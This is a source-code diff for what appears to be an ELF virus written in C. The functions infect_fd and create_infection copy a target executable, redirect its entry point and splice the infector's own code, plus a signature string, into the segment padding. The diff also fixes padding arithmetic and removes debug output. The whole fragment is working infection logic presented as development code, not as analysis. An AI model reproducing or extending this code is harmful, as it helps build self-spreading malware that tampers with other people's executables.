@@ -120,15 +120,14 @@ int			infect_fd(int fd, t_elf *elf)
 		return (ret);
 	}
 	Elf64_Phdr	*next = elf->pt_load + 1;
-	int		size_needed = INJECT_SIZE + ((intptr_t)_start - (intptr_t)infect);
+	int		size_needed = INJECT_SIZE + ft_strlen(SIGNATURE) + ((intptr_t)_start - (intptr_t)infect);
 	int		psize_offset = next->p_offset % PAGE_SIZE;
 	int		nb_zero_to_add = psize_offset - (next->p_offset + size_needed) % PAGE_SIZE;
+	if (nb_zero_to_add < 0)
+		nb_zero_to_add = (next->p_offset + size_needed) % PAGE_SIZE - psize_offset;
 	int		previous_padding = next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz);
 	char	*new;
 
-	ft_putstr("size: ");
-	ft_putnbr(size_needed + nb_zero_to_add);
-	ft_putstr("\n");
 	new = syscall_mmap(NULL, elf->size + size_needed + nb_zero_to_add - previous_padding, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
 	if (!new)
 	{
@@ -189,9 +188,6 @@ void	create_infection(void *dst, t_elf *elf, int nb_zero)
     Elf64_Off    e_shoff;
 
 	start = dst;
-	ft_putstr("dst start: ");
-	ft_putnbr(dst - start);
-	ft_putstr("\n");
 	src = elf->addr;
 	end = src + elf->size;
 	ft_memcpy(dst, src, (unsigned long)&elf->header->e_entry - (unsigned long)src);
@@ -214,9 +210,10 @@ void	create_infection(void *dst, t_elf *elf, int nb_zero)
 	add_injection(&dst, elf, new_entry, entry_infect);
 	ft_memcpy(dst, infect, ((intptr_t)_start - (intptr_t)infect));
 	dst += (intptr_t)_start - (intptr_t)infect;
+	ft_memcpy(dst, SIGNATURE, ft_strlen(SIGNATURE));
+	dst += ft_strlen(SIGNATURE);
 	ft_memset(dst, 0, nb_zero);
 	dst += nb_zero;
-
 
 	Elf64_Phdr	*next = elf->pt_load + 1;
 
@@ -225,8 +222,5 @@ void	create_infection(void *dst, t_elf *elf, int nb_zero)
 	src = add_padding_sections(elf, src, &dst, nb_zero);
 	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
 	dst += (unsigned long)end - (unsigned long)src;
-	ft_putstr("dst end: ");
-	ft_putnbr(dst - start);
-	ft_putstr("\n");
 }
 
